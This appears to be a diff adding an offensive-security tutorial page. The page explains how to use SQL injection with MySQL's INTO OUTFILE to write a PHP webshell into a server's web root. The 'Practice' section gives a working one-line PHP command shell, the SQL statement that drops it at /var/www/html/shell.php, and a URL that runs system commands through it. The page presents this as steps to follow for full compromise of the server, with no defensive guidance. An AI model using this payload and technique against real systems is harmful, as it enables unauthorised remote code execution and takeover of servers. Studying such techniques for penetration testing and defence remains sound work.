@@ -1,0 +1,68 @@
+---
+title: Deploying PHP Webshell via MySQL OUTFILE Method
+description: Learn to exploit MySQL's OUTFILE method for deploying a PHP webshell,
+  achieving remote code execution through SQL injection vulnerabilities.
+keywords:
+- MySQL OUTFILE
+- webshell deployment
+- SQL injection
+- remote code execution
+- PHP webshell
+---
+
+# WEBSHELL - OUTFILE Method
+
+## Context
+
+The purpose of this article is to teach how to exploit MySQL's OUTFILE method to deploy a webshell for remote code execution. This technique leverages SQL injection vulnerabilities and the MySQL's FILE privilege to write a PHP webshell to the web server's file system. The reader is assumed to have knowledge of webshells, file system permissions, and the MySQL FILE privilege, as well as familiarity with MySQL command execution techniques.
+
+## Theory
+
+### MySQL OUTFILE Method
+
+The OUTFILE method in MySQL is typically used for writing the result of a query to a file. However, this command can be misused by attackers to write arbitrary files to the server if file system permissions and privileges are not properly controlled. By exploiting an SQL injection vulnerability, attackers can execute the OUTFILE command to drop malicious files, such as a webshell, onto the server.
+
+#### How It Works
+- **Definition**: OUTFILE is a MySQL command that outputs the result of a SELECT statement to a file.
+- **Vulnerability Model**: When misused, this feature can act as a conduit for writing arbitrary files to the server.
+- **Attack Sequence**: Use SQL injection to execute OUTFILE, enabling file writes in directories accessible by the web server.
+
+### Webshell Deployment via OUTFILE
+
+Webshells are scripts that enable command execution via a web interface. Deploying a webshell through the OUTFILE method involves injecting SQL code to write a script into a directory exposed by the web server.
+
+#### Key Concepts
+- **Core Principle**: Use SQL injection to transmit a PHP webshell onto a server.
+- **Precondition**: The MySQL user must possess the FILE privilege, and the write path must be a web-accessible directory.
+- **Deploy Process**: Inject SQL to use OUTFILE, thereby sending PHP code to a specified path.
+
+## Practice
+
+### Deploying a PHP Webshell via OUTFILE
+
+To successfully deploy a PHP webshell via the OUTFILE method, follow these steps:
+
+- **Identify a writable directory**: You need a directory on the server where the web server has write access and can execute files. Common paths include web root directories such as `/var/www/html` or `/htdocs`.
+
+- **Execute SQL Command to Write Webshell**: Use an SQL injection point to execute the following command:
+    ```bash
+    SELECT '<?php system($_GET[\'cmd\']); ?>' INTO OUTFILE '/var/www/html/shell.php';
+    ```
+    This command writes a simple PHP webshell to the targeted directory.
+
+- **Verify Web Server Permissions**: Before accessing the webshell, ensure the web server has permission to execute PHP files in the specified directory.
+
+- **Access the Webshell**: Use a web browser to navigate to the newly created webshell and execute commands:
+    ```plaintext
+    http://target/shell.php?cmd=id
+    ```
+    This URL will trigger the webshell to run the `id` command on the server, illustrating command execution.
+
+### Result
+
+By leveraging this technique, you achieve remote code execution capabilities. Accessing the PHP webshell allows you to run arbitrary commands on the server, potentially leading to complete system compromise.
+
+## Tools
+
+- **MySQL Client**: Essential for executing SQL commands.
+- **Web Browser**: Required to interact with the deployed webshell.
